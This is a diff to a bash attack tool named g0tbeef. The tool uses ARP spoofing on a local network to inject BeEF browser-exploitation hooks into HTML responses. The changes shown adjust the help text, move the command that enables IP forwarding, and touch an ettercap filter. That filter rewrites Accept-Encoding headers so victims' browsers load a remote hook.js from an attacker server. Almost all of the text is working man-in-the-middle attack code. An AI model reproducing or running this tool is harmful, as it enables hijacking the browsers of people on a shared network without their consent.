@@ -13,14 +13,14 @@ g0tbeef - Inject Beef hooks into html responses via ARP spoofing
 
 Usage:  g0tbeef <options>
 
-		-t <ip> 	~  ip extension to target
-		-r <ip> 	~  full ip address for beef server
-		-p <port>	~  port of beef server
-		-e          	~  external ip address for beef server
+		-t <ip>   ~  ip extension to target
+		-r <ip>   ~  remote beef server
+		-p <port> ~  port of beef server
+		-e        ~  external ip address for beef server
 
 Examples:
 	g0tbeef -t 2								
-	  ~  Attack xx.xx.xx.2 beef hook: $MYI:3000/hook.js
+	  ~  Attack "$LAN"2 beef hook: $MYI:3000/hook.js
 	  
 	g0tbeef -r googlebeefhook.com -p 80	
 	  ~  beef hook: http://googlebeefhook.com:80/hook.js
@@ -34,8 +34,6 @@ do
 	case $ARG in "-h")fhelp;;"--help")fhelp;;"-e")EXTR=1;;"-r")IP=$(echo $@ | cut -d " " -f $ACNT);;"-p")PORT=$(echo $@ | cut -d " " -f $ACNT);;"-t")TARG=$(echo $@ | cut -d " " -f $ACNT);esac
 done
 
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
 if [ $IP -z ] 2> /dev/null
 then
 	if [ $EXTR -z ] 2> /dev/null
@@ -43,7 +41,7 @@ then
 		IP=$(ifconfig | grep $LAN | cut -d ':' -f 2 | cut -d ' ' -f 1)
 	else
 		echo " [*] Retrieving external IP address.."
-		IP=$(curl ifconfig.me)
+		IP=$(curl -s ifconfig.me)
 		if [ $IP -z ] 2> /dev/null
 		then
 			echo
@@ -70,7 +68,7 @@ then
 else
 	TARG=$LAN$TARG
 fi
-
+echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 'if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
       replace("Accept-Encoding", "Accept-Hackers!"); 
